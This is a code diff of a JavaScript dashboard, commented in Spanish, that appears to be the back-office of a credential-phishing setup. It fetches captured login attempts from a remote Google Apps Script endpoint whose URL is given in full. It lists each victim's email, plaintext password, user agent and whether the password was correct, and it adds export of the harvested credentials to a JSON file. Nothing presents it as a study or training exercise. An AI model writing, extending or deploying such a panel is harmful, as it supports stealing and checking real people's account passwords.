@@ -1,3 +1,6 @@
+// Configuración - MISMA URL que arriba
+const API_URL = 'https://script.google.com/macros/s/AKfycbzeRJSHD1uZcdXTARiCBMZadSKC-bACw8U7Zrzbrg_0dt6G_evmY4trrxekAmsbVink9g/exec';
+
 document.addEventListener('DOMContentLoaded', function() {
     const dataContent = document.getElementById('dataContent');
     const refreshBtn = document.getElementById('refreshData');
@@ -13,30 +16,38 @@ document.addEventListener('DOMContentLoaded', function() {
     // Botón actualizar
     refreshBtn.addEventListener('click', loadData);
 
-    // Botón limpiar
+    // Botón limpiar (esto limpiará solo localmente)
     clearBtn.addEventListener('click', function() {
-        if (confirm('¿Estás seguro de que quieres eliminar TODOS los datos?')) {
-            localStorage.removeItem('loginAttempts');
-            loadData();
-            alert('🗑️ Todos los datos han sido eliminados');
+        if (confirm('¿Estás seguro de que quieres limpiar la vista local?')) {
+            dataContent.innerHTML = '<p class="no-data">No hay datos guardados aún</p>';
+            updateStats([]);
         }
     });
 
     // Botón exportar
     exportBtn.addEventListener('click', exportData);
 
-    function loadData() {
-        const loginAttempts = JSON.parse(localStorage.getItem('loginAttempts')) || [];
-        
-        updateStats(loginAttempts);
-        updateDataContent(loginAttempts);
+    async function loadData() {
+        try {
+            const response = await fetch(API_URL);
+            const result = await response.json();
+            
+            if (result.success) {
+                updateStats(result.data);
+                updateDataContent(result.data);
+            } else {
+                alert('Error cargando datos: ' + result.error);
+            }
+        } catch (error) {
+            alert('Error de conexión: ' + error.message);
+        }
     }
 
     function updateStats(attempts) {
         totalAttempts.textContent = attempts.length;
         
-        const success = attempts.filter(attempt => attempt.status.includes('CORRECTO')).length;
-        const failed = attempts.filter(attempt => attempt.status.includes('INCORRECTO')).length;
+        const success = attempts.filter(attempt => attempt.Status && attempt.Status.includes('CORRECTO')).length;
+        const failed = attempts.filter(attempt => attempt.Status && attempt.Status.includes('INCORRECTO')).length;
         
         successAttempts.textContent = success;
         failedAttempts.textContent = failed;
@@ -50,15 +61,18 @@ document.addEventListener('DOMContentLoaded', function() {
 
         let html = '';
         loginAttempts.forEach((attempt, index) => {
-            const statusClass = attempt.status.includes('CORRECTO') ? 'status-correct' : 'status-incorrect';
+            const statusClass = attempt.Status && attempt.Status.includes('CORRECTO') ? 'status-correct' : 'status-incorrect';
             html += `
                 <div class="user-data">
                     <div class="user-header">
-                        <span class="user-email">📧 ${attempt.email}</span>
-                        <span class="status ${statusClass}">${attempt.status}</span>
+                        <span class="user-email">📧 ${attempt.Email || 'N/A'}</span>
+                        <span class="status ${statusClass}">${attempt.Status || '❌ INCORRECTO'}</span>
                     </div>
-                    <div class="user-password">🔑 ${attempt.password}</div>
-                    <div class="user-meta">⏰ ${attempt.timestamp}</div>
+                    <div class="user-password">🔑 ${attempt.Password || 'N/A'}</div>
+                    <div class="user-meta">
+                        ⏰ ${attempt.Timestamp || 'N/A'} 
+                        ${attempt.UserAgent ? `<br>🖥️ ${attempt.UserAgent.substring(0, 50)}...` : ''}
+                    </div>
                 </div>
             `;
         });
@@ -67,20 +81,18 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 
     function exportData() {
-        const loginAttempts = JSON.parse(localStorage.getItem('loginAttempts')) || [];
-        
-        if (loginAttempts.length === 0) {
-            alert('No hay datos para exportar');
-            return;
-        }
-
-        const data = {
+        // Esto exportará los datos actuales cargados
+        const dataToExport = {
             exportDate: new Date().toISOString(),
-            totalRecords: loginAttempts.length,
-            loginAttempts: loginAttempts
+            data: Array.from(document.querySelectorAll('.user-data')).map(item => ({
+                email: item.querySelector('.user-email').textContent.replace('📧 ', ''),
+                password: item.querySelector('.user-password').textContent.replace('🔑 ', ''),
+                status: item.querySelector('.status').textContent,
+                timestamp: item.querySelector('.user-meta').textContent.split('⏰ ')[1]?.split(' ')[0]
+            }))
         };
 
-        const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+        const blob = new Blob([JSON.stringify(dataToExport, null, 2)], { type: 'application/json' });
         const url = URL.createObjectURL(blob);
         const a = document.createElement('a');
         a.href = url;
@@ -89,7 +101,5 @@ document.addEventListener('DOMContentLoaded', function() {
         a.click();
         document.body.removeChild(a);
         URL.revokeObjectURL(url);
-        
-        alert(`✅ Datos exportados correctamente (${loginAttempts.length} registros)`);
     }
 });
